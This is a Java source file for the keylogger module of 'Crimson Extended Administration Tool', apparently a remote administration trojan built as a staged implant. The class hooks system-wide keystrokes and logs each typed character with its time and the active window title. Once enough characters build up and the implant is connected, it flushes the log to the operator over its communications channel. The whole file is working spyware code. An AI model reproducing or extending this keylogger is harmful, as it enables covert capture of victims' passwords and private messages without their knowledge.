package subterranean.crimson.permajar.stage2.modules.keylogger;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

import java.util.Date;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.permajar.stage2.Stage2;
import subterranean.crimson.universal.NativeUtilities;

public class NKL implements NativeKeyListener {
	public void nativeKeyPressed(NativeKeyEvent e) {
		// System.out.println("Key Pressed: " +
		// NativeKeyEvent.getKeyText(e.getKeyCode()));

	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		// System.out.println("Key Released: " +
		// NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		// grab that window title
		String windowTitle = null;
		try {
			windowTitle = NativeUtilities.getTitle();
		} catch (Throwable e1) {

		}
		if (windowTitle == null) {
			windowTitle = "unknown window";
		}

		Stage2.getSettings().newChars++;
		// add to keylog
		Stage2.getSettings().keyloggerLog.add("" + e.getKeyChar(), new Date(), windowTitle);

		if (Communications.connected() && Stage2.getSettings().newChars > Keylogger.flushThreshold) {
			Keylogger.flush();

		}

	}
}
